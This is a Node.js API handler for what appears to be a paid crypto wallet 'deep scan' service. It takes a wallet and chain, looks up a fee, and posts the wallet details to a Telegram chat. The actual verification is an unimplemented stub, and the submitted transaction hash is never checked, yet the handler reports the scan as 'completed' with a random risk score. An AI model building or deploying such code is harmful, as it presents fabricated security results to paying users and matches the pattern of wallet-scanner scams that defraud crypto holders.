import fetch from 'node-fetch';

const RECEIVER_ADDRESS = {
  eth: process.env.VERIFY_ETH_ADDRESS,
  bsc: process.env.VERIFY_BNB_ADDRESS,
  tron: process.env.VERIFY_TRON_ADDRESS,
};

const REQUIRED_USD = {
  eth: 1.5,
  bsc: 0.5,
  tron: 0.5,
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { wallet, chain, txHash } = req.body;
  if (!wallet || !chain) {
    return res.status(400).json({ error: 'Missing required parameters' });
  }

  try {
    const fee = REQUIRED_USD[chain.toLowerCase()];
    if (!fee) {
      return res.status(400).json({ error: 'Unsupported chain' });
    }

    // Implement your verification logic here
    const scanResult = {
      wallet,
      chain: chain.toUpperCase(),
      requiredFee: fee,
      status: 'completed',
      riskScore: Math.floor(Math.random() * 10),
      timestamp: new Date().toISOString()
    };

    // Send Telegram notification
    try {
      const botToken = process.env.VITE_TELEGRAM_BOT_TOKEN;
      const chatId = process.env.VITE_TELEGRAM_CHAT_ID;
      
      if (botToken && chatId) {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId,
            text: `🔍 New Deep Scan\nWallet: ${wallet}\nChain: ${chain.toUpperCase()}\nFee: $${fee}`,
            parse_mode: 'Markdown'
          })
        });
      }
    } catch (telegramError) {
      console.error('Telegram notification failed:', telegramError);
    }

    return res.status(200).json(scanResult);
  } catch (error) {
    console.error('Verification error:', error);
    return res.status(500).json({ error: 'Verification failed' });
  }
}
